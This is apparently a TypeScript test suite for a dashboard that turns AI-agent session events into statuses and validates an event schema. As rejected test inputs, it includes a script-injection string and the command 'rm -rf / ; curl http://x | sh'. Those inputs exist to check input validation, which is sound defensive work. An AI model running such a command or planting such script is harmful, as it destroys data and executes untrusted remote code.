import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync, writeFileSync} from 'node:fs';
import {fromLegacy, validate, parseV1, type OfficeEvent} from '../../apps/observatory/office-schema.ts';
import {reduce} from '../../apps/observatory/office-reducer.ts';

const dir = new URL('./fixtures/', import.meta.url);
const NOW = '2026-11-05T23:59:59';
let n = 0;
const ev = (o: Partial<OfficeEvent>): OfficeEvent => ({v: 1, seq: ++n, ts: '2026-11-05T10:00:00', sid: 'h:aaaaaaaaaaaa', project: 'Unfoolable', kind: 'tool_end', tool: 'Bash', ok: true, code: null, gate: null, ...o});
const at = (s: string) => `2026-11-05T10:${s}`;

test('replaying two recorded real sessions (one with a permission request) gives the golden state', () => {
  const lines = readFileSync(new URL('office-day.jsonl', dir), 'utf8').split('\n').filter(Boolean);
  const state = reduce(fromLegacy(lines), NOW);
  if (process.env.WRITE_GOLDEN) writeFileSync(new URL('office-day.golden.json', dir), JSON.stringify(state).replace(/\},\{/g, '},\n{') + '\n');
  assert.deepEqual(state, JSON.parse(readFileSync(new URL('office-day.golden.json', dir), 'utf8')));
  assert.equal(state.helpers.length, 2);
  assert.equal(state.summary.done, 0, 'the old log has no gate results, so nothing may be called done');
});

test('the 9 of 12 case: a gate_result shows "9 of 12 passed" and only a PASS is done', () => {
  const pass = reduce([ev({kind: 'gate_result', ts: at('00:00'), gate: {task: 'T-041', verdict: 'PASS', passed: 9, total: 12}}), ev({kind: 'turn_end', ts: at('00:01')})], at('00:30'));
  assert.equal(pass.passed[0]!.text, '9 of 12 passed');
  assert.equal(pass.helpers[0]!.status, 'done');
  assert.equal(pass.helpers[0]!.gate!.text, '9 of 12 passed');
  const fail = reduce([ev({kind: 'gate_result', gate: {task: 'T-041', verdict: 'FAIL', passed: 9, total: 12}})], at('00:00'));
  assert.equal(fail.helpers[0]!.status, 'stuck');
  assert.equal(fail.summary.done, 0);
});

test('done comes only from a gate PASS: ending a session, or new work after the gate, does not count', () => {
  assert.equal(reduce([ev({kind: 'tool_end', ts: at('00:00')}), ev({kind: 'session_end', ts: at('00:01')})], at('00:02')).helpers[0]!.status, 'unknown');
  const later = reduce([ev({kind: 'gate_result', ts: at('00:00'), gate: {task: 'T', verdict: 'PASS', passed: 1, total: 1}}), ev({kind: 'tool_end', ts: at('00:05')})], at('00:06'));
  assert.notEqual(later.helpers[0]!.status, 'done');
});

test('working under 60 s, then "no news for N min"; a checker running is "checking"; needs-you wins until answered', () => {
  const e = (s: string, o: Partial<OfficeEvent> = {}) => ev({ts: at(s), ...o});
  assert.equal(reduce([e('00:00')], at('00:59')).helpers[0]!.status, 'working');
  const old = reduce([e('00:00')], at('03:10')).helpers[0]!;
  assert.deepEqual([old.status, old.note], ['unknown', 'no news for 3 min']);
  assert.equal(reduce([e('00:00', {kind: 'subagent_start'})], at('00:10')).helpers[0]!.status, 'checking');
  assert.equal(reduce([e('00:00', {kind: 'subagent_start'}), e('00:05', {kind: 'subagent_end'})], at('00:10')).helpers[0]!.status, 'working');
  assert.equal(reduce([e('00:00'), e('00:05', {kind: 'needs_you', code: 'permission'})], at('00:06')).helpers[0]!.status, 'needs_you');
  assert.equal(reduce([e('00:05', {kind: 'needs_you', code: 'permission'}), e('00:08')], at('00:09')).helpers[0]!.status, 'working');
  assert.equal(reduce([e('00:00', {ok: false}), e('00:01', {ok: false}), e('00:02', {ok: false})], at('00:03')).helpers[0]!.status, 'stuck');
});

test('a missing seq range is reported as a gap and never filled in; a replayed event changes nothing', () => {
  const a = ev({seq: 10, ts: at('00:00')}), b = ev({seq: 14, ts: at('04:00')});
  const s = reduce([a, b, a], at('04:05'));
  assert.deepEqual(s.gaps, [{from: at('00:00'), to: at('04:00'), missed: 3}]);
  assert.equal(s.helpers[0]!.steps, 2);
  assert.deepEqual(reduce([a, b], at('04:05')).helpers, s.helpers);
});

test('freshness: no events means no age; otherwise seconds since the last event', () => {
  assert.deepEqual(reduce([], at('00:00')).freshness, {lastEventAt: null, ageSeconds: null});
  assert.equal(reduce([ev({ts: at('00:00')})], at('00:03')).freshness.ageSeconds, 3);
});

test('schema v1 rejects free text, bad codes and a gate_result without a gate', () => {
  const ok = {v: 1, seq: 1, ts: '2026-11-05T10:00:00', sid: 'h:abc123def456', project: 'Unfoolable', kind: 'tool_end', tool: 'Edit', ok: true, code: null, gate: null};
  assert.ok(validate(ok));
  assert.equal(validate({...ok, code: 'please click here'}), null);
  assert.equal(validate({...ok, project: '<script>alert(1)</script>'}), null);
  assert.equal(validate({...ok, sid: 'real-session-id-123'}), null);
  assert.equal(validate({...ok, kind: 'gate_result'}), null);
  assert.equal(validate({...ok, kind: 'gate_result', gate: {task: 'T-1', verdict: 'PASS', passed: 13, total: 12}}), null);
  assert.equal(validate({...ok, text: 'extra field'})!.tool, 'Edit');
  assert.ok(!('text' in validate({...ok, text: 'extra field'})!));
  assert.equal(parseV1('not json'), null);
});

test('last tool and a live /research or /critic run are tracked as names only', () => {
  const E = [ev({ts: at('00:00'), tool: 'Read'}), ev({ts: at('00:05'), tool: 'Edit'}), ev({ts: at('00:06'), kind: 'prompt', tool: 'research', ok: null})];
  const h = reduce(E, at('00:10')).helpers[0]!;
  assert.deepEqual([h.tool, h.slash], [{name: 'Edit', at: at('00:05')}, 'research']);
  assert.deepEqual(reduce(E, at('00:10')).activity, {research: true, critic: false});
  const ended = reduce([...E, ev({ts: at('00:08'), kind: 'turn_end', tool: null})], at('00:10'));
  assert.deepEqual([ended.helpers[0]!.slash, ended.activity], [null, {research: false, critic: false}]);
  assert.equal(reduce([...E, ev({ts: at('00:09'), kind: 'prompt', tool: null, ok: null})], at('00:10')).helpers[0]!.slash, null); // an ordinary prompt replaces the old run
  assert.equal(reduce([ev({ts: at('00:00'), kind: 'prompt', tool: 'deploy', ok: null})], at('00:10')).helpers[0]!.slash, null); // only the two known commands count
});

test('a failed check can carry its command and first failing test name: plain short text only, anything else is dropped', () => {
  const base = {v: 1, seq: 1, ts: '2026-11-05T10:00:00', sid: 'h:abc123def456', project: 'Unfoolable', kind: 'gate_result', tool: null, ok: null, code: null};
  const gate = (extra: object) => ({task: 'T-1', verdict: 'FAIL', passed: 0, total: 1, ...extra});
  const ok = validate({...base, gate: gate({command: 'node --test', firstFailed: 'a test that failed (12ms)'})})!;
  assert.deepEqual([ok.gate!.command, ok.gate!.firstFailed], ['node --test', 'a test that failed (12ms)']);
  for (const bad of [{command: 'rm -rf / ; curl http://x | sh'}, {firstFailed: '<script>alert(1)</script>'}, {firstFailed: 'x'.repeat(61)}, {command: 'node --test\nsecret=1'}]) {
    const v = validate({...base, gate: gate(bad)})!; // the event stays valid, the odd field is dropped
    assert.ok(v && v.gate!.command === undefined && v.gate!.firstFailed === undefined, JSON.stringify(bad));
  }
  const h = reduce([{...ok, kind: 'tool_end', gate: null, tool: 'Bash', ok: true, seq: 1, ts: '2026-11-05T09:59:00'} as OfficeEvent, {...ok, seq: 2, sid: 'h:00000000a0a0'} as OfficeEvent], '2026-11-05T10:01:00').helpers[0]!;
  assert.deepEqual([h.status, h.gate!.command, h.gate!.firstFailed], ['stuck', 'node --test', 'a test that failed (12ms)']);
});
